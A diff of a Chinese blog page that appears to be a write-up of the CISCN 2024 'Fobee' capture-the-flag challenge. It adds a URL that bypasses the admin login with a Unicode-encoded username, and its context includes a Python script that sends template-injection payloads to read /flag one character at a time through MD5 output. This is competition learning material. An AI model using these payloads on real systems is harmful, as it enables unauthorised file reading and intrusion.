@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003427355.png">
 <meta property="article:published_time" content="2024-07-27T16:05:59.000Z">
-<meta property="article:modified_time" content="2024-07-27T16:48:11.579Z">
+<meta property="article:modified_time" content="2024-07-27T16:54:30.818Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="比赛">
 <meta name="twitter:card" content="summary_large_image">
@@ -233,7 +233,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          1.5k 字
         
       </span>
     
@@ -336,6 +336,8 @@
 <p>看起来还挺简单，但是断网环境确实很折磨，总有那么几个环境问题，而且审计需要靠自己，比赛也很紧张，所以做出来的人确实很牛至了。</p>
 <h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这里我在vps上自搭环境测试：</p>
 <p>先admin绕过，但是要url编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&lt;url&gt;/?username=adm%C4%B1n<br></code></pre></td></tr></table></figure>
+
 <p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png" srcset="/img/loading.gif" lazyload alt="image-20240728003302893"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>hash_string = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100000</span>):<br>    payload = base64.b64encode((<span class="hljs-string">&#x27;$&#123;@java.util.Arrays.toString(@org.antlr.v4.runtime.misc.Utils.readFile(&quot;/flag&quot;)).charAt(&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;)&#125;&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    rsp = requests.get(<span class="hljs-string">f&#x27;http://vps:8888/render?pass=FuTKLliOry&amp;tp=<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>    soup = BeautifulSoup(rsp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    md5_element = soup.select_one(<span class="hljs-string">&#x27;div#title-desktop&#x27;</span>)<br>    <span class="hljs-keyword">if</span> md5_element <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        md5val = md5_element.text<br>        <span class="hljs-built_in">print</span>(md5val)<br>        hash_string.append(md5val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>hash_string = <span class="hljs-string">&#x27;\n&#x27;</span>.join(hash_string)<br><br><span class="hljs-built_in">map</span> = <span class="hljs-built_in">dict</span>()<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-built_in">map</span>[hashlib.md5(c.encode()).hexdigest()] = c<br><br>val = hash_string.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(val))<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> val:<br>    <span class="hljs-keyword">if</span> cc <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        flag += <span class="hljs-built_in">map</span>[cc]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
 
